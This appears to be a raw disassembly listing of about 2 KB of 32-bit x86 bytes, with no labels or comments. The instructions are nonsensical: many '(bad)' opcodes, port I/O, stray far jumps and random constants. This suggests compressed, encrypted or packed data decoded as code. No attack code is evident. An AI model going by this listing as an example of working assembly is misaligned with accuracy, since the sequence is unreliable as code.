  414e0d:	fs and eax,0xb5549522
  414e13:	xor    BYTE PTR [esi],0x8
  414e16:	push   0x12
  414e18:	adc    bh,ah
  414e1a:	push   ebx
  414e1b:	or     BYTE PTR [edx],dl
  414e1d:	or     esp,DWORD PTR ds:[eax]
  414e20:	bound  ebp,QWORD PTR [edi+esi*1]
  414e23:	out    dx,al
  414e24:	stos   BYTE PTR es:[edi],al
  414e25:	sub    bh,BYTE PTR [eax]
  414e27:	mov    ebp,0x1ac84b18
  414e2c:	dec    ebp
  414e2d:	ret    0x7456
  414e30:	fidiv  DWORD PTR [ecx]
  414e32:	and    ah,bl
  414e34:	mov    dh,dl
  414e36:	jne    0x414e75
  414e38:	and    BYTE PTR [eax-0x45799681],al
  414e3e:	ret    0x5d05
  414e41:	(bad)  
  414e42:	loope  0x414e30
  414e44:	(bad)  
  414e45:	sub    eax,0x92572e4d
  414e4a:	push   eax
  414e4c:	push   0xd
  414e4e:	adc    DWORD PTR ss:[bx+si-0x7a],ebx
  414e53:	jns    0x414e1f
  414e55:	pop    ss
  414e56:	jb     0x414e5c
  414e58:	clc    
  414e59:	add    bh,BYTE PTR [ebx-0x1228b892]
  414e5f:	xchg   ebx,eax
  414e60:	xchg   ebx,eax
  414e61:	xor    eax,0x27dd2989
  414e66:	mov    edi,0x4a5901d9
  414e6b:	adc    dl,BYTE PTR [edi]
  414e6d:	test   DWORD PTR [ecx],0xf8650c81
  414e73:	sahf   
  414e74:	push   0x90ee5b1a
  414e79:	shl    DWORD PTR [ebx],1
  414e7b:	hlt    
  414e7c:	xor    cl,BYTE PTR [ebx+0x27]
  414e7f:	mov    edi,0x67e8545e
  414e84:	fmulp  st(6),st
  414e86:	(bad)  
  414e87:	ss sub eax,0x1954531d
  414e8d:	pop    ecx
  414e8e:	xor    eax,0x8506a092
  414e93:	adc    eax,0x455c6dfc
  414e98:	sbb    al,0x6e
  414e9a:	cdq    
  414e9b:	shr    bh,cl
  414e9d:	mov    dl,dh
  414e9f:	cdq    
  414ea0:	mov    es,WORD PTR [esi+0x73]
  414ea3:	in     al,0x5f
  414ea5:	adc    DWORD PTR [edi-0x40e6f160],ebp
  414eab:	or     edx,DWORD PTR [ecx]
  414ead:	dec    ecx
  414eae:	push   ebx
  414eaf:	or     BYTE PTR [edx-0x78b7db29],ah
  414eb5:	aas    
  414eb6:	jmp    0x414eb5
  414eb8:	ret    0x9d73
  414ebb:	pop    ebx
  414ebc:	sbb    DWORD PTR [edx],0xffffffa2
  414ebf:	rcr    DWORD PTR [edx],0x43
  414ec2:	xor    DWORD PTR [ecx+0x72],esp
  414ec5:	adc    al,0x3c
  414ec7:	sti    
  414ec8:	in     eax,dx
  414ec9:	loopne 0x414edf
  414ecb:	xor    eax,0x18c8204
  414ed0:	cmp    al,BYTE PTR [edx]
  414ed2:	pop    esi
  414ed3:	into   
  414ed4:	dec    ecx
  414ed5:	xor    bl,BYTE PTR [edx-0x6533c012]
  414edb:	dec    ebx
  414edc:	ret    
  414edd:	cmp    bl,cl
  414edf:	adc    bh,dl
  414ee1:	jp     0x414eee
  414ee3:	retf   0x38bc
  414ee6:	mov    dh,0xcc
  414ee8:	push   edx
  414ee9:	mov    edi,0xd547cdaa
  414eee:	outs   dx,BYTE PTR ds:[esi]
  414eef:	or     eax,DWORD PTR [eax+0x59]
  414ef2:	jbe    0x414ea9
  414ef4:	or     al,bl
  414ef6:	addr16 das 
  414ef8:	cmp    DWORD PTR [edx],esp
  414efa:	ins    DWORD PTR es:[edi],dx
  414efb:	pop    esp
  414efc:	inc    ebp
  414efd:	fsubp  st(7),st
  414eff:	aam    0x58
  414f01:	repz push es
  414f03:	inc    eax
  414f04:	mov    bh,0xa2
  414f06:	mov    edx,0xfe2b8246
  414f0b:	cdq    
  414f0c:	cmp    al,0xf7
  414f0e:	jl     0x414ea7
  414f10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f11:	imul   ebx,DWORD PTR [esi+0x28fb65ea],0x9875575d
  414f1b:	add    al,BYTE PTR [ecx]
  414f1d:	push   esp
  414f1e:	ror    BYTE PTR [edx+esi*4-0x9],0x58
  414f23:	(bad)  
  414f24:	and    DWORD PTR [edx-0x4b5c0976],edx
  414f2a:	enter  0x1c5a,0xe0
  414f2e:	dec    edx
  414f2f:	dec    esi
  414f30:	or     ebx,esp
  414f32:	clc    
  414f33:	jne    0x414ef3
  414f35:	or     bl,BYTE PTR [eax-0x17]
  414f38:	mov    bh,0x76
  414f3a:	pop    eax
  414f3b:	xor    cl,BYTE PTR [esi+esi*4]
  414f3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f3f:	cmp    al,BYTE PTR [edx+0x532f3174]
  414f45:	out    0x60,al
  414f47:	imul   edi,esi,0xe9434822
  414f4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f4e:	test   eax,0x5a710aff
  414f53:	out    0xf5,eax
  414f55:	xchg   ebx,eax
  414f56:	push   esi
  414f57:	scas   eax,DWORD PTR es:[edi]
  414f58:	fiadd  DWORD PTR [eax+0x66]
  414f5b:	test   DWORD PTR [edx],0xc23dec7d
  414f61:	or     BYTE PTR [ebx+0x507bf0f2],ah
  414f67:	push   ebp
  414f68:	sar    BYTE PTR [esi+0x2337aeb3],1
  414f6e:	int3   
  414f6f:	aas    
  414f70:	(bad)  
  414f71:	xor    eax,0xc5ceac16
  414f76:	push   0x59
  414f78:	and    edi,ecx
  414f7a:	xchg   esp,eax
  414f7b:	xor    eax,0x5dcd1a02
  414f80:	or     al,0x7e
  414f82:	jbe    0x414fb4
  414f84:	sub    eax,0x4cdd366b
  414f89:	daa    
  414f8a:	popa   
  414f8b:	xor    eax,0xaa912327
  414f90:	adc    ecx,DWORD PTR ds:0x3bd67b5
  414f96:	mov    eax,ds:0xb2d04dd6
  414f9b:	ins    DWORD PTR es:[edi],dx
  414f9c:	push   0x34
  414f9e:	sbb    al,0xe1
  414fa0:	push   esp
  414fa1:	pop    esi
  414fa2:	std    
  414fa3:	xchg   edx,eax
  414fa4:	cmc    
  414fa5:	add    bl,BYTE PTR ds:0xc960def9
  414fab:	jl     0x414f62
  414fad:	aaa    
  414fae:	adc    eax,DWORD PTR [esi+0x58ab7925]
  414fb4:	adc    al,0x3f
  414fb6:	call   0x80b81c3a
  414fbb:	cmp    BYTE PTR [edx+esi*2+0x37c7eb1b],dl
  414fc2:	retf   
  414fc3:	(bad)  
  414fc4:	into   
  414fc5:	mov    dh,0xb2
  414fc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414fc8:	jne    0x415046
  414fca:	loope  0x414fd5
  414fcc:	daa    
  414fcd:	and    eax,0xe435bce7
  414fd2:	test   al,0x6e
  414fd4:	mov    eax,ds:0x37cc9564
  414fd9:	cmp    al,0xa2
  414fdb:	cmp    eax,0x2dd61111
  414fe0:	enter  0x7a45,0x78
  414fe4:	pop    ebp
  414fe5:	xchg   ebp,eax
  414fe6:	cmp    edi,edx
  414fe8:	pop    edx
  414fe9:	inc    cx
  414feb:	sub    BYTE PTR [edx-0x777c990c],dh
  414ff1:	cmp    DWORD PTR [esi-0x7faee0df],ebx
  414ff7:	xchg   esp,eax
  414ff8:	outs   dx,BYTE PTR ds:[esi]
  414ff9:	push   0x19
  414ffb:	fisubr DWORD PTR [ebx]
  414ffd:	mov    ebp,0x9a72b0fd
  415002:	in     al,0xfb
  415004:	mov    bl,al
  415006:	mov    eax,0x7e9a9993
  41500b:	test   BYTE PTR [edx+0x19],cl
  41500e:	call   0xaa40d880
  415013:	and    ah,bl
  415015:	lods   al,BYTE PTR ds:[esi]
  415016:	repz or DWORD PTR [edx],0x6a9f8237
  41501d:	jmp    0x7f840138
  415022:	icebp  
  415023:	xor    BYTE PTR [esi+0x74c1a770],0x28
  41502a:	xchg   ecx,eax
  41502b:	or     dh,dl
  41502d:	add    edi,DWORD PTR [ecx*8-0x3311976f]
  415034:	sti    
  415035:	sar    BYTE PTR [esi+0x5d4b0820],0x4a
  41503c:	dec    edi
  41503d:	int    0xf
  41503f:	ret    0x7206
  415042:	inc    ebx
  415043:	test   esi,ebp
  415045:	xchg   ecx,eax
  415046:	scas   eax,DWORD PTR es:[edi]
  415047:	sti    
  415048:	mov    dl,0x0
  41504a:	test   DWORD PTR [eax+0x38],0x6d2d9744
  415051:	or     eax,0x9b12e6e2
  415056:	jmp    0x5921:0xa91e7a15
  41505d:	mov    ah,0x60
  41505f:	mov    edx,0x75ee75ac
  415064:	pop    es
  415065:	fisttp WORD PTR [ebx+0x5803512c]
  41506b:	jmp    0x48a4:0xea000f1f
  415072:	loope  0x4150bd
  415074:	pop    esp
  415075:	xchg   edx,eax
  415076:	dec    edi
  415077:	mov    esp,0x6de067af
  41507c:	and    eax,ecx
  41507e:	stos   DWORD PTR es:[edi],eax
  41507f:	aaa    
  415080:	fidiv  DWORD PTR [ebx]
  415082:	outs   dx,DWORD PTR ds:[esi]
  415083:	stos   BYTE PTR es:[edi],al
  415084:	cwde   
  415085:	outs   dx,DWORD PTR ds:[esi]
  415086:	(bad)  [esi+ebx*1-0x13]
  41508a:	mov    bl,0xe3
  41508c:	inc    esi
  41508d:	dec    esp
  41508e:	cmp    DWORD PTR [edx+edi*2],esp
  415091:	or     dh,cl
  415093:	fs mul bh
  415096:	les    ebx,FWORD PTR ds:0x9f6bca15
  41509c:	add    eax,0x7222197a
  4150a1:	inc    ebx
  4150a2:	mov    dl,0x45
  4150a4:	aaa    
  4150a5:	je     0x4150c8
  4150a7:	(bad)  
  4150a9:	loop   0x4150e8
  4150ab:	aaa    
  4150ac:	call   0xa008f95
  4150b1:	mov    DWORD PTR [ebp+ebx*2+0x244fdfa6],eax
  4150b8:	in     al,0xc5
  4150ba:	jecxz  0x415124
  4150bc:	bound  esi,QWORD PTR [edi-0x74677bc5]
  4150c2:	add    al,0x63
  4150c4:	xchg   ecx,eax
  4150c5:	cdq    
  4150c6:	das    
  4150c7:	into   
  4150c8:	lods   al,BYTE PTR ds:[esi]
  4150c9:	cmp    ebp,DWORD PTR [ecx+0x29]
  4150cc:	or     eax,0x2a7dd192
  4150d1:	iret   
  4150d2:	cs xchg ebx,eax
  4150d4:	cmp    cl,bh
  4150d6:	repnz clc 
  4150d8:	mov    ?,WORD PTR [ecx+0x16]
  4150db:	jmp    DWORD PTR [ebp+0x79]
  4150de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150df:	ss clc 
  4150e1:	lea    esi,[esi]
  4150e3:	cmp    ebx,DWORD PTR [ecx-0x5f2ca87d]
  4150e9:	sar    BYTE PTR [eax+edx*8],0x3d
  4150ed:	mov    esi,0x6d3cc681
  4150f2:	add    al,0x72
  4150f4:	add    ch,ah
  4150f6:	jl     0x415169
  4150f8:	test   eax,0xf30a2b97
  4150fd:	mov    ebx,0xd99e679a
  415102:	shr    BYTE PTR [edi+0x70],1
  415105:	dec    ebp
  415106:	jne    0x41511a
  415108:	mov    dh,0x58
  41510a:	xchg   DWORD PTR [edi-0x70090092],esp
  415110:	lods   al,BYTE PTR ds:[esi]
  415111:	enter  0x5a3f,0xf5
  415115:	xchg   edx,eax
  415116:	cs cs (bad) 
  415119:	fs pop es
  41511b:	ins    BYTE PTR es:[edi],dx
  41511c:	aad    0xe3
  41511e:	mov    esi,0x5dfc123d
  415123:	gs in  eax,0x23
  415126:	fsubr  QWORD PTR [eax]
  415128:	arpl   WORD PTR [edx],ax
  41512a:	adc    esi,DWORD PTR [esi+0x38d9a987]
  415130:	imul   ebp,DWORD PTR [edx],0x3b
  415133:	std    
  415134:	fist   WORD PTR [ebp+0x38]
  415137:	xchg   esi,eax
  415138:	adc    BYTE PTR [ebx+esi*4-0x55b82cc7],0xc0
  415140:	inc    esi
  415141:	inc    esp
  415142:	fcom   DWORD PTR [ebx+0x1f068b45]
  415148:	repz sbb DWORD PTR [edx+ebp*8-0x7],edx
  41514d:	cld    
  41514e:	mov    BYTE PTR [edi+0x63],cl
  415151:	(bad)  
  415152:	push   ds
  415153:	push   0xffffff91
  415155:	pop    edi
  415156:	pop    ecx
  415157:	lods   eax,DWORD PTR ds:[esi]
  415158:	cwde   
  415159:	adc    al,0x1b
  41515b:	push   edx
  41515c:	fstp   QWORD PTR [ecx+0x46]
  41515f:	sahf   
  415160:	push   ss
  415161:	add    al,0x54
  415163:	pop    es
  415164:	sar    dl,cl
  415166:	out    dx,eax
  415167:	jbe    0x4151bb
  415169:	(bad)  
  41516a:	or     ecx,DWORD PTR [ebp-0x6a]
  41516d:	push   ecx
  41516e:	sub    BYTE PTR [ecx],al
  415170:	mov    edi,DWORD PTR [ebp-0x19d7ce7a]
  415176:	pusha  
  415177:	push   ss
  415178:	and    DWORD PTR [ebp+0x5737035],edx
  41517e:	mov    ds,ebp
  415180:	xchg   edx,eax
  415181:	mov    ebx,0xdc8a98e6
  415186:	daa    
  415187:	mov    ecx,?
  415189:	jl     0x41510f
  41518b:	out    0x6c,eax
  41518d:	inc    ecx
  41518e:	add    bh,BYTE PTR [esi-0x7a3b4f91]
  415194:	sbb    esp,DWORD PTR [ecx+0xa82295d]
  41519a:	push   0x7f
  41519c:	sub    dh,dh
  41519e:	sti    
  41519f:	add    BYTE PTR [edx-0x1c],ah
  4151a2:	ss jmp esp
  4151a5:	mov    ebp,0x93198fc5
  4151aa:	rcr    BYTE PTR [ebx+ecx*1+0x1f6bb010],cl
  4151b1:	push   eax
  4151b2:	mov    dh,0xea
  4151b4:	inc    ebp
  4151b5:	cmc    
  4151b6:	(bad)  
  4151b7:	fist   DWORD PTR [edi+0x32110bb0]
  4151bd:	cld    
  4151be:	push   esi
  4151bf:	int    0xe
  4151c1:	push   esi
  4151c2:	mov    eax,0x4a6d5ce6
  4151c7:	xor    al,0x88
  4151c9:	(bad)  
  4151ca:	xchg   ebp,eax
  4151cb:	jo     0x415226
  4151cd:	sub    al,0xd1
  4151cf:	and    al,0xcc
  4151d1:	add    al,0x98
  4151d3:	mov    ch,0xb8
  4151d5:	clc    
  4151d6:	shr    DWORD PTR [ebx-0x12],cl
  4151d9:	jne    0x4151d8
  4151db:	xchg   ebx,eax
  4151dc:	mov    dh,0xd5
  4151de:	fs jmp 0x8ca7:0x508b9a87
  4151e6:	fnstcw WORD PTR ds:0x9d748eea
  4151ec:	mov    esp,0xa3b131ed
  4151f1:	ret    0x848d
  4151f4:	hlt    
  4151f5:	arpl   si,dx
  4151f7:	sbb    edx,DWORD PTR [ebx+0x4f7e4113]
  4151fd:	pusha  
  4151fe:	and    eax,0xfda7d09b
  415203:	mov    ds:0x1d0b3383,al
  415208:	and    DWORD PTR [ebp-0x1b901318],ebp
  41520e:	sub    ebx,DWORD PTR [edx+0x42]
  415211:	mov    esi,0xa7ec409
  415217:	cmc    
  415218:	mov    ?,edi
  41521a:	ja     0x415267
  41521c:	idiv   ch
  41521e:	aad    0x22
  415220:	add    dl,BYTE PTR [edi-0x77]
  415223:	cmc    
  415224:	popa   
  415225:	jo     0x41520c
  415227:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415228:	enter  0x1de3,0x31
  41522c:	div    DWORD PTR [edx]
  41522e:	push   esp
  41522f:	mov    ebx,0xb89bd4ba
  415234:	jb     0x41522b
  415236:	lods   eax,DWORD PTR ds:[esi]
  415237:	aas    
  415238:	mov    bl,0xaf
  41523a:	sbb    ecx,edx
  41523c:	mov    dh,0x77
  41523e:	pop    ecx
  41523f:	jmp    0x100e:0xa508dbc8
  415246:	(bad)  
  415247:	cld    
  415248:	sub    ecx,esp
  41524a:	mov    bh,0x2d
  41524c:	loope  0x41522a
  41524e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41524f:	add    eax,0xebcd7683
  415254:	int3   
  415255:	mov    ebp,DWORD PTR [ecx+0x42]
  415258:	or     eax,0x72bcb3c8
  41525d:	mov    ecx,0x4c554f75
  415262:	sbb    DWORD PTR [ebx-0x3c0640f1],ecx
  415268:	pusha  
  415269:	or     edx,edi
  41526b:	and    DWORD PTR [ecx-0x6a],ebp
  41526e:	aas    
  41526f:	in     ax,dx
  415271:	mov    ebp,DWORD PTR [ebx-0x21]
  415274:	pop    ebp
  415275:	int3   
  415276:	and    al,0x21
  415278:	pop    ebx
  415279:	sub    esp,DWORD PTR [eax+0x5f]
  41527c:	sub    ch,BYTE PTR [eax+0x7ae1ba9c]
  415282:	xchg   edx,eax
  415283:	xchg   esi,eax
  415284:	retf   
  415285:	push   edi
  415286:	in     al,dx
  415287:	xchg   ecx,eax
  415288:	stos   BYTE PTR es:[edi],al
  415289:	sub    bl,BYTE PTR [ebp+0x5a]
  41528c:	inc    eax
  41528d:	pop    ebx
  41528e:	adc    eax,DWORD PTR [ebp+eax*2-0x76]
  415292:	cmp    edi,DWORD PTR [ebp+0x18]
  415295:	mov    bh,BYTE PTR [eax-0x73a060a3]
  41529b:	and    al,0xa
  41529d:	cmc    
  41529e:	mov    WORD PTR [edx-0x5d],?
  4152a1:	xor    al,0xfe
  4152a3:	dec    esi
  4152a4:	call   0x15be3e3a
  4152a9:	sbb    BYTE PTR [esi+0x77],bl
  4152ac:	jmp    0x2b8:0x81948c05
  4152b3:	(bad)  
  4152b4:	imul   eax,DWORD PTR [ecx-0x57],0x6a81e08e
  4152bb:	das    
  4152bc:	xchg   DWORD PTR [esi],ecx
  4152be:	in     eax,dx
  4152bf:	mov    al,0x8
  4152c1:	(bad)  
  4152c2:	into   
  4152c3:	int    0xe2
  4152c5:	int3   
  4152c6:	or     al,0xf5
  4152c8:	lods   eax,DWORD PTR ds:[esi]
  4152c9:	xchg   ebx,eax
  4152ca:	je     0x4152b0
  4152cc:	push   ecx
  4152cd:	pop    ebx
  4152ce:	popa   
  4152cf:	fdiv   DWORD PTR [eax+0x62b955e0]
  4152d5:	pop    esi
  4152d6:	mov    eax,DWORD PTR [ebx]
  4152d8:	inc    DWORD PTR [edi+0x75]
  4152db:	sub    DWORD PTR [eax-0x3d39cedc],0x3f
  4152e2:	iret   
  4152e3:	sets   BYTE PTR [ebp-0x53f030d3]
  4152ea:	and    al,0x1d
  4152ec:	outs   dx,DWORD PTR ds:[esi]
  4152ed:	adc    dl,bh
  4152ef:	es jg  0x415287
  4152f2:	inc    ebp
  4152f3:	sti    
  4152f4:	jae    0x415352
  4152f6:	sub    BYTE PTR [ebx-0x49614626],cl
  4152fc:	xlat   BYTE PTR ds:[ebx]
  4152fd:	sbb    ecx,DWORD PTR ds:0xe7ffe2e2
  415303:	aas    
  415304:	mov    BYTE PTR [ecx],ch
  415306:	fild   DWORD PTR ds:0x13a452b8
  41530c:	call   0xc4228111
  415311:	sbb    BYTE PTR [esi],dl
  415313:	jmp    0x415390
  415315:	or     ecx,ecx
  415317:	sbb    eax,0xe1bf6eb5
  41531c:	in     al,dx
  41531d:	test   BYTE PTR ds:[edi],ch
  415320:	mov    BYTE PTR [ebp+0x52],bl
  415323:	pusha  
  415324:	or     eax,0x20712f04
  415329:	outs   dx,BYTE PTR ds:[esi]
  41532a:	sbb    BYTE PTR [ebx-0x35],dl
  41532d:	repnz mov DWORD PTR [ecx+ebx*2-0x5b],ebp
  415332:	mov    ds:0x66921a5e,eax
  415337:	nop
  415338:	inc    ecx
  415339:	retf   0xd45c
  41533c:	pusha  
  41533d:	repnz sub al,0xe
  415340:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  415342:	push   0xa
  415344:	pop    ds
  415345:	jge    0x4152e8
  415347:	pop    ebx
  415348:	ja     0x4152d7
  41534a:	data16 std 
  41534c:	mov    edx,0x7cfd610f
  415351:	pop    ebx
  415352:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415353:	enter  0x4c21,0x3c
  415357:	mov    esp,DWORD PTR [esi+0x5d]
  41535a:	shl    DWORD PTR gs:[ebx],1
  41535d:	retf   0xb1d7
  415360:	sar    BYTE PTR [eax-0x2b],0x4a
  415364:	and    al,0x61
  415366:	jbe    0x41533d
  415368:	outs   dx,DWORD PTR ds:[esi]
  415369:	xor    cl,BYTE PTR [ebx+0x1f]
  41536c:	cmp    DWORD PTR [esi+0x747db1ce],0x594c9709
  415376:	xchg   DWORD PTR [esi-0x74],ebp
  415379:	pushf  
  41537a:	sbb    ah,BYTE PTR ds:0x3b7406aa
  415380:	cmc    
  415381:	sbb    DWORD PTR [ebp-0x6],0xffffffb0
  415385:	adc    DWORD PTR [ebp+0x124092bf],esp
  41538b:	mov    dh,0x47
  41538d:	cmp    BYTE PTR [edx-0x690bf84e],0x4
  415394:	add    eax,0xf013ac2b
  415399:	dec    sp
  41539b:	or     bl,bh
  41539d:	sbb    eax,0x9b325795
  4153a2:	adc    cl,dh
  4153a4:	xor    al,0x80
  4153a6:	jne    0x4153cd
  4153a8:	adc    ecx,DWORD PTR [ebx]
  4153aa:	inc    esp
  4153ab:	sbb    edx,eax
  4153ad:	lds    edi,FWORD PTR [eax-0x271bbbcd]
  4153b3:	loopne 0x415385
  4153b5:	or     BYTE PTR [esi-0x759a9d71],bl
  4153bb:	sar    BYTE PTR [ecx+0x7ef910db],1
  4153c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4153c2:	hlt    
  4153c3:	pop    es
  4153c4:	ror    ch,0x58
  4153c7:	ins    BYTE PTR es:[edi],dx
  4153c8:	dec    esi
  4153c9:	push   ebp
  4153ca:	(bad)  
  4153cd:	add    al,0xe8
  4153d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153d1:	push   0xffffffae
  4153d3:	xor    al,BYTE PTR [edi+0x3a]
  4153d6:	push   0x72f915bf
  4153db:	xor    cl,BYTE PTR [edi-0x3e]
  4153de:	and    dl,cl
  4153e0:	outs   dx,BYTE PTR ds:[esi]
  4153e1:	adc    al,BYTE PTR [esi+ebp*2+0xc]
  4153e5:	sub    BYTE PTR [esi-0x80],dl
  4153e8:	jle    0x415457
  4153ea:	cmp    dl,BYTE PTR [ebx]
  4153ec:	and    al,0x8e
  4153ee:	shl    BYTE PTR [eax+0x415dc003],1
  4153f4:	es pop ecx
  4153f6:	popa   
  4153f7:	jnp    0x415414
  4153f9:	(bad)  
  4153fa:	mov    eax,0x286e1edc
  4153ff:	popa   
  415400:	dec    ebx
  415401:	fmul   QWORD PTR [edi+0x39]
  415404:	jmp    0x415431
  415406:	pop    ebp
  415407:	or     edi,edx
  415409:	gs inc eax
  41540b:	pop    edi
  41540c:	jg     0x4153e9
  41540e:	das    
  41540f:	pushf  
  415410:	mov    edx,0xd351504c
  415415:	and    al,0xe1
  415417:	adc    ecx,DWORD PTR [edx+0x682cf361]
  41541d:	sar    DWORD PTR [edx+0x40],1
  415420:	mov    ebx,0xe7b6bcaf
  415425:	mov    edi,0x327d4600
  41542a:	and    edi,DWORD PTR [ebx+0x44]
  41542d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41542e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41542f:	lahf   
  415430:	loope  0x41546d
  415432:	and    bh,ah
  415434:	jb     0x4153cc
  415436:	sbb    eax,0xf538da8
  41543b:	inc    edi
  41543c:	out    dx,eax
  41543d:	lods   al,BYTE PTR ds:[esi]
  41543e:	ror    BYTE PTR [esi],cl
  415440:	adc    DWORD PTR [ebp-0x3c0a20e3],eax
  415446:	jmp    0x486a:0xb64492f8
  41544d:	jo     0x415490
  41544f:	add    al,0xa4
  415451:	pushf  
  415452:	jno    0x415425
  415454:	dec    eax
  415455:	das    
  415456:	cli    
  415457:	add    edi,DWORD PTR [ebx-0xb]
  41545a:	dec    cl
  41545c:	xor    DWORD PTR [ebx+0x40f9ceb3],0xbadc7e8f
  415466:	xchg   ecx,eax
  415467:	and    eax,0x4ada7679
  41546c:	fwait
  41546d:	icebp  
  41546e:	sbb    DWORD PTR [ecx-0x4861df8f],ebp
  415474:	mov    bl,0xd9
  415476:	or     cl,bh
  415478:	stos   BYTE PTR es:[edi],al
  415479:	or     DWORD PTR [edi],esp
  41547b:	pop    ebp
  41547c:	sbb    BYTE PTR [eax],ch
  41547e:	addr16 cwde 
  415480:	cs push esp
  415482:	neg    DWORD PTR [eax]
  415484:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415485:	ror    BYTE PTR [ecx+0x5dc17d2],cl
  41548b:	push   cs
  41548c:	aas    
  41548d:	int    0x64
  41548f:	dec    ebx
  415490:	rcr    BYTE PTR [esi+edi*2-0x66],cl
  415494:	add    DWORD PTR es:[edi+0x2a],edi
  415498:	jecxz  0x415443
  41549a:	push   esp
  41549b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41549c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41549d:	(bad)  
  41549e:	and    eax,0x2d8a90ba
  4154a3:	out    dx,al
  4154a4:	shl    DWORD PTR [edx-0x13],cl
  4154a7:	or     eax,0x82da973a
  4154ac:	or     BYTE PTR [eax-0x54],ah
  4154af:	int    0x1f
  4154b1:	int    0x5b
  4154b3:	mov    edi,0x46adc286
  4154b8:	shr    DWORD PTR [edx],0x94
  4154bb:	xchg   edi,eax
  4154bc:	push   ebp
  4154bd:	jns    0x415446
  4154bf:	loopne 0x4154de
  4154c1:	ds xor bl,dl
  4154c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4154c5:	jo     0x41545a
  4154c7:	gs loopne 0x41549c
  4154ca:	or     edi,DWORD PTR [ecx+0x5dec42ac]
  4154d0:	cmp    DWORD PTR [edi-0x1e],ecx
  4154d3:	dec    ebx
  4154d4:	adc    edx,0xffffffc7
  4154d7:	xchg   ecx,eax
  4154d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154d9:	stc    
  4154da:	aam    0x18
  4154dc:	sbb    bh,BYTE PTR [eax]
  4154de:	xor    dl,al
  4154e0:	sbb    bl,dh
  4154e2:	or     BYTE PTR [edx+0x19248ecb],dh
  4154e8:	cmp    esi,DWORD PTR [esi-0x3f]
  4154eb:	mov    ebp,0x7e78cac3
  4154f0:	or     eax,0x48d12edf
  4154f5:	add    BYTE PTR [esi-0x7f986028],dh
  4154fb:	daa    
  4154fc:	test   eax,0xdf312b91
  415501:	xor    DWORD PTR [ecx],eax
  415503:	add    eax,0x51e00acb
  415508:	sbb    BYTE PTR [edx-0x33],ah
  41550b:	xor    ebp,edi
  41550d:	mov    esp,0x7b33d6c9
  415512:	sub    al,BYTE PTR [ecx]
  415514:	(bad)  
  415515:	js     0x4154c9
  415517:	mov    al,ds:0xd27c54df
  41551c:	mov    ecx,0x9b7a8f3d
  415521:	in     al,0x1d
  415523:	stos   BYTE PTR es:[edi],al
  415524:	xchg   ebp,eax
  415525:	test   eax,0xb95d802b
  41552a:	mov    WORD PTR [eax],cs
  41552c:	push   ebx
  41552d:	and    BYTE PTR [ecx],cl
  41552f:	cwde   
  415530:	stc    
  415531:	mov    cl,0x3b
  415533:	es ins BYTE PTR es:[edi],dx
  415535:	jle    0x415565
  415537:	mov    dl,0x6e
  415539:	sbb    eax,0xe720800d
  41553e:	jmp    0x415584
  415540:	nop
  415541:	add    DWORD PTR [eax],0x5903b213
  415547:	add    eax,0xa60f7224
  41554c:	pop    edx
  41554d:	jo     0x415594
  41554f:	adc    BYTE PTR [eax],dl
  415551:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415552:	dec    esi
  415553:	pop    ds
  415554:	fld    TBYTE PTR [ebx-0x1736e66e]
  41555a:	call   0x1199f81b
  41555f:	mov    bl,cl
  415561:	test   DWORD PTR [eax+0x567e412b],esi
  415567:	and    eax,0x192c1798
  41556c:	pop    ds
  41556d:	lahf   
  41556e:	cld    
  41556f:	pop    es
  415570:	inc    edx
  415571:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  415573:	adc    esp,DWORD PTR [edx-0x71]
  415576:	add    BYTE PTR ds:0x75c90760,0xd5
  41557d:	in     eax,dx
  41557e:	popa   
  41557f:	push   0xffffff89
  415581:	jmp    0x415598
  415583:	shr    BYTE PTR [ebx],cl
  415585:	mov    ebx,0x4c169ec5
  41558a:	cli    
  41558b:	lds    edx,FWORD PTR [edx+0x3eb48a9a]
  415591:	daa    
  415592:	(bad)  [eax-0x36de8645]
  415598:	push   ss
  415599:	bound  eax,QWORD PTR [ecx]
  41559b:	sub    ecx,ebp
  41559d:	adc    al,0x96
  41559f:	cmp    edx,esp
  4155a1:	test   BYTE PTR [esi+ebx*8],al
  4155a4:	cli    
  4155a5:	mov    esp,edi
  4155a7:	and    eax,0x68b1961b
  4155ac:	ss nop
  4155ae:	scas   eax,DWORD PTR es:[edi]
  4155af:	or     eax,0x41f0637f
  4155b4:	jno    0x41561f
  4155b6:	test   BYTE PTR [ebx+ebx*1+0x1fb19ddb],0xec
  4155be:	add    eax,0xd7a18830
  4155c3:	bound  ebp,QWORD PTR [edi+edx*8+0x34]
  4155c7:	std    
  4155c8:	leave  
  4155c9:	int    0x8a
  4155cb:	add    esp,ecx
  4155cd:	xor    eax,0x179c4fef
  4155d2:	push   ebp
  4155d3:	push   ebx
  4155d4:	xchg   DWORD PTR [esi-0x6f],ebp
  4155d7:	mov    eax,ds:0xc6a1ac61
  4155dc:	out    0x28,al
  4155de:	push   esi
  4155df:	add    bh,BYTE PTR [edx]
  4155e1:	cmp    ebp,ecx
  4155e3:	sbb    DWORD PTR [edi-0x4],ecx
  4155e6:	xor    dh,ah
  4155e8:	sbb    DWORD PTR [ecx-0x4a0a6a21],ecx
  4155ee:	mov    al,0xc1
  4155f0:	inc    edi
  4155f1:	in     al,dx
  4155f2:	fistp  WORD PTR [edi+0x115ebae3]
  4155f8:	or     ch,cl
  4155fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
